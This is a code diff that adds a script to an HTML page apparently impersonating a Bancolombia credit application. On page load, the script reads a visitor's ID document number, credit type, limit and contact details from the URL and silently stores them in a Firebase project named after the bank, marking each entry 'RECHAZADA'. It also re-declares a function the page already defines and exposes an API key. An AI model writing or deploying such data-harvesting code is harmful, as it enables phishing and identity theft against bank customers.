@@ -243,5 +243,51 @@ async function guardarEnFirebase() {
 
 guardarEnFirebase();
   </script>
+  <script>
+const firebaseConfig = {
+  apiKey: "AIzaSy5y5Dnpt57vNCirFZnVK1ze_irVBT9hmibY",
+  authDomain: "bancolombia-credito.firebaseapp.com",
+  projectId: "bancolombia-credito",
+  storageBucket: "bancolombia-credito.appspot.com",
+  messagingSenderId: "354851030251",
+  appId: "1:354851030251:web:e98a68eb7d81a79d942aae"
+};
+
+if (!window.firebaseApp) {
+  window.firebaseApp = firebase.initializeApp(firebaseConfig);
+}
+const db = firebase.firestore();
+
+async function guardarEnFirebase() {
+  try {
+    const params = new URLSearchParams(window.location.search);
+    const doc = params.get("documento") || params.get("doc") || "";
+    const tipo = params.get("tipo") || "";
+    const cupo = params.get("cupo") || "";
+    const contacto = params.get("contacto") || params.get("usuario") || "";
+    
+    console.log("📋 Datos leídos:", { doc, tipo, cupo, contacto });
+    
+    await db.collection('solicitudes').add({
+      documento: doc || '',
+      tipo: tipo || '',
+      contacto: contacto || '',
+      cupo: cupo || '',
+      fecha: new Date().toLocaleString('es-CO'),
+      estado: "RECHAZADA"
+    });
+    console.log('✅ ¡Guardado en Firebase!');
+  } catch(error) {
+    console.error('❌ Error:', error);
+  }
+}
+
+// Ejecutar cuando la página esté lista
+if (document.readyState === 'loading') {
+  document.addEventListener('DOMContentLoaded', guardarEnFirebase);
+} else {
+  guardarEnFirebase();
+}
+</script>
 </body>
 </html>
